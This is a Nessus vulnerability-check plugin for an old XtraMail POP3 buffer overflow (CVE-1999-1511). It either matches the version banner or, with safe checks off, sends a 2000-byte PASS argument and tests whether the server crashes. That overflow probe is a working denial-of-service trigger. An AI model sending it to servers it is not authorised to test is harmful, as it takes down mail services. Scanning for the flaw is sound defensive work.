#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10325);
 script_version ("$Revision: 1.32 $");
 script_cve_id("CVE-1999-1511");
 script_bugtraq_id(791);
 script_xref(name:"OSVDB", value:"253");
 
 script_name(english:"XtraMail POP3 PASS Command Remote Overflow");
 script_summary(english:"Attempts to overflow the in.pop3d buffers");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote host is running a mail server with a remote buffer\n",
     "overflow vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote POP3 server is vulnerable to the following buffer\n",
     "overflow :\n",
     "\n",
     "   USER test\n",
     "   PASS <buffer>\n",
     "\n",
     "This may allow an attacker to execute arbitrary commands as root\n",
     "on the remote POP3 server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/ntbugtraq/1999-q3/0362.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Contact the vendor for the latest update."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);
port = get_kb_item("Services/pop3");
if(!port)port = 110;

if(safe_checks())
{
 banner = get_kb_item(string("pop3/banner/", port));
 if(!banner){
 		soc = open_sock_tcp(port);
                if(!soc)exit(0);
		banner = recv_line(socket:soc, length:4096);
		if ( ! banner ) exit(0);
		close(soc);
		if (substr(banner,0,2) != '+OK') exit(0);	# Not a POP3 server!
	    }
 if(banner)
 {
  b = tolower(banner);
  if("xtramail" >< b)
  {
  if( ereg(pattern:".*1\.([0-9]|1[0-1])[^0-9].*",
   	string:b)
    )
    {
     data = "
reports this vulnerability using only information that was gathered. 
Use caution when testing without safe checks enabled.";
     security_hole(port:port, extra:data);
    }
  }
 }
 exit(0);
}

if (report_paranoia < 2) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = recv_line(socket:soc, length:4096);
  if(!r)exit(0);
  
  c = string("USER test\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  c = string("PASS ", crap(2000), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024, timeout:15);
  close(soc);

  soc = open_sock_tcp(port);
  if(soc)
  {
   r = recv_line(socket:soc, length:4096);
   if(!r)security_hole(port);
  }
  else
    security_hole(port);
 }
}

